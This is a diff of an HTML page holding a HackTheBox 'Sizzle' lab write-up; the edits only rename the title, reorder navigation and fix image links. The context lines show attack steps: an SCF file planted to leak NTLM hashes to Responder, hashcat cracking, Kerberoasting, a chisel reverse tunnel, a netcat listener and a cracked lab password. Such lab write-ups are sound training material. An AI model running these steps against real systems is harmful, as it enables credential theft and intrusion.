@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-06-09T14:33:47 EDT">
-<title>Sizzle :: DocDock Documentation</title>
+<meta name="revised" content="2019-06-09T14:41:23 EDT">
+<title>Sizzle-Gold :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -275,17 +275,17 @@
         <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item active">
-    <div>
-        <a href="/hackthebox/boxes/gold-sizzle/">
-            Sizzle
-        </a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
 <li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
     <div>
         <a href="/hackthebox/boxes/sizzle/">
             Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
@@ -571,8 +571,8 @@
     <option value="/hackthebox/boxes/secnotes/" >
   -- 
    SecNotes</option>
-      <option value="/hackthebox/boxes/gold-sizzle/"  selected>-- Sizzle</option>
       <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/"  selected>-- Sizzle-Gold</option>
     <option value="/hackthebox/boxes/valentine/" >
   -- 
    Valentine</option>
@@ -624,13 +624,13 @@
       </div>
     
 
-    <h1>Sizzle</h1>
+    <h1>Sizzle-Gold</h1>
     
     
     
     
 
-<p><img src="https://chickenpwny.github.io/images/sizzle/smb-gazebos.jpg" alt="smb-gazebos" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/smbgazebos.jpg" alt="smbgazebos" /></p>
 
 <p>Nmap</p>
 
@@ -662,29 +662,29 @@
 
 <p><strong>WEB APPLICATION ####  PHASE 1 #####</strong></p>
 
-<p>​   <img src="C:Hugositesblogstaticimagessizzlewebpage-initial.PNG" alt="webpage-initial" /></p>
+<p>​   <img src="https://chickenpwny.github.io/images/sizzle/webpage-initial.PNG" alt="webpage-initial" /></p>
 
 <p>Gobuster</p>
 
 <pre><code>gobuster -w /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt -u http://10.10.10.103/ -t 40 
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlegobuster-iis.PNG" alt="gobuster-iis" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/gobuster-iis.PNG" alt="gobuster-iis" /></p>
 
 <p>Wfuzz</p>
 
 <pre><code>wfuzz --hc 404 -c -w  /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt &quot;http://sizzle.htb/FUZZ&quot;
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlewfuzz-IIS.PNG" alt="wfuzz-IIS" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/wfuzz-IIS.PNG" alt="wfuzz-IIS" /></p>
 
 <p>SIZZLE.HTB/CERTSRV</p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlewebpage-initial2.PNG" alt="webpage-initial2" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/webpage-initial2.PNG" alt="webpage-initial2" /></p>
 
 <h3 id="smb-enumeration-phase2"><strong>SMB ENUMERATION ####  PHASE2  #####</strong></h3>
 
-<p><img src="C:Hugositesblogstaticimagessizzleshares.jpg" alt="shares" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/shares.jpg" alt="shares" /></p>
 
 <p>SMB - here we will find that the shares are not writeable. That the directories subfolder are writeable. that when a share is listed as READ ONLY that is refereeing tot he share itself. That doesn&rsquo;t mean the shares aren&rsquo;t writeable. Writing a simple bash script to enumerate the shares. then droping a scf file that will contect back to our host. Responder will collect the users ntlm hash.</p>
 
@@ -694,7 +694,7 @@
 smbclient -N -L //10.10.10.103
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlesmb-enum3.PNG" alt="smb-enum3" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum3.PNG" alt="smb-enum3" /></p>
 
 <p>Mounting the Share locally &amp; FOR LOOP TOUCH ALL YOU OVER</p>
 
@@ -707,9 +707,9 @@ smbclient -N -L //10.10.10.103
 for folder in /mnt/sizzle/**/*; do touch &quot;$folder&quot;;done
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlesmb-enum.PNG" alt="smb-enum" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum.PNG" alt="smb-enum" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlesmb-enum2.PNG" alt="smb-enum2" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum2.PNG" alt="smb-enum2" /></p>
 
 <p>SCF ##  shell command file performs a limited set of windows explorer commands. opening windows explorer or showing the desktop. one of the functions of this file is you can pull the icon image from the internet. whenever the file is browsed it will connect back to a smb our smb-server.</p>
 
@@ -734,13 +734,13 @@ Command=ToggleDesktop
 <pre><code>responder -I tun0 -e 10.10.10.103
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlesmb-enum4.PNG" alt="smb-enum4" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/smb-enum4.PNG" alt="smb-enum4" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleamanda-ntlm-hashes.PNG" alt="amanda-ntlm-hashes" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/amanda-ntlm-hashes.PNG" alt="amanda-ntlm-hashes" /></p>
 
 <p>HASHCAT / john sucks</p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlehashcat-1000x479.jpg" alt="hashcat-1000x479" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/hashcat-1000x479.jpg" alt="hashcat-1000x479" /></p>
 
 <p>When saving the hashes in notepad be sure to encode using <strong>ANSI</strong> or you will get a bit error. modules 5600 for ntlm hashes using rock you shouldn&rsquo;t take long.</p>
 
@@ -748,9 +748,9 @@ Command=ToggleDesktop
  .\hashcat64.exe -m 13100 .\mrlky.hashes .\rockyou.txt --show
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlesavehashes.PNG" alt="savehashes" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/savehashes.PNG" alt="savehashes" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlehashcat.PNG" alt="hashcat" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/hashcat.PNG" alt="hashcat" /></p>
 
 <h3 id="myca-phase-3"><strong>MYCA   ### PHASE  3###</strong></h3>
 
@@ -766,19 +766,19 @@ Command=ToggleDesktop
 
 <p>provides a web platform for issueing anad managing public keys infrastructure or pki certificates. When you logon as a valid user if will issue you a cert of any kind a CA or public key.</p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert3.PNG" alt="install-cert3" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert3.PNG" alt="install-cert3" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert2.PNG" alt="install-cert2" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert2.PNG" alt="install-cert2" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert4.PNG" alt="install-cert4" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert4.PNG" alt="install-cert4" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert.PNG" alt="install-cert" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert.PNG" alt="install-cert" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlemozilla-cert.PNG" alt="mozilla-cert" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/mozilla-cert.PNG" alt="mozilla-cert" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert5.PNG" alt="install-cert5" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert5.PNG" alt="install-cert5" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzleinstall-cert6.PNG" alt="install-cert6" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/install-cert6.PNG" alt="install-cert6" /></p>
 
 <p>OPENSSL making the ssl certs. this creates two distinct files.</p>
 
@@ -786,7 +786,7 @@ Command=ToggleDesktop
 openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlemd5sum.PNG" alt="md5sum" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/md5sum.PNG" alt="md5sum" /></p>
 
 <p>CHANGES MADE TO WINRM RUBY</p>
 
@@ -809,9 +809,9 @@ openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt
 )
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlessl_stuff.PNG" alt="ssl_stuff" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/ssl_stuff.PNG" alt="ssl_stuff" /></p>
 
-<p><img src="C:Hugositesblogstaticimagessizzlewinrm-key.PNG" alt="winrm-key" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/winrm-key.PNG" alt="winrm-key" /></p>
 
 <p>CLM / CHISEL TUNNELS     ##### PHASE 4 #####</p>
 
@@ -827,7 +827,7 @@ openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt
 <pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;           
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlenet-framework.PNG" alt="net-framework" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/net-framework.PNG" alt="net-framework" /></p>
 
 <pre><code>PowerShell -Version 2 -ExecutionPolicy ByPass -command &quot;command here&quot;
 </code></pre>
@@ -874,7 +874,7 @@ nc -lvnp portNUmbers
 <pre><code>./chisel server -port 8000 --reverse -v
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlechisel.PNG" alt="chisel" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/chisel.PNG" alt="chisel" /></p>
 
 <p>The finale part for this phase is collecting mrlky kerb hashes. using GetUserSPNs.py  which can be found in IMPACKET ON KALI locate getuserspns.py. getuserspns.py just hangs. smb wont work if there is a huge time difference between the two host &amp; client.</p>
 
@@ -891,7 +891,7 @@ date +%T -s &quot;windowstime&quot;
 <pre><code>./GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out w
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlemrlkyhashes.PNG" alt="mrlkyhashes" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/mrlkyhashes.PNG" alt="mrlkyhashes" /></p>
 
 <p>HASHCAT - Kerberos 5</p>
 
@@ -902,7 +902,7 @@ date +%T -s &quot;windowstime&quot;
 Football#7
 </code></pre>
 
-<p><img src="C:Hugositesblogstaticimagessizzlemrlkyhashes2.PNG" alt="mrlkyhashes2" /></p>
+<p><img src="https://chickenpwny.github.io/images/sizzle/mrlkyhashes2.PNG" alt="mrlkyhashes2" /></p>
 
 <p>WEBAPP AGAIN MRLKY MYCA #### PHASE 5 #####</p>
 
@@ -993,8 +993,8 @@ cd c:\Windows\System32\spool\drivers\color\
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/secnotes/" title="SecNotes"> <i class="fa fa-chevron-left"></i><label>SecNotes</label></a>
-    <a class="nav nav-next" href="/hackthebox/boxes/sizzle/" title="Sizzle" style="margin-right: 0px;"><label>Sizzle</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/sizzle/" title="Sizzle"> <i class="fa fa-chevron-left"></i><label>Sizzle</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/valentine/" title="Valentine" style="margin-right: 0px;"><label>Valentine</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
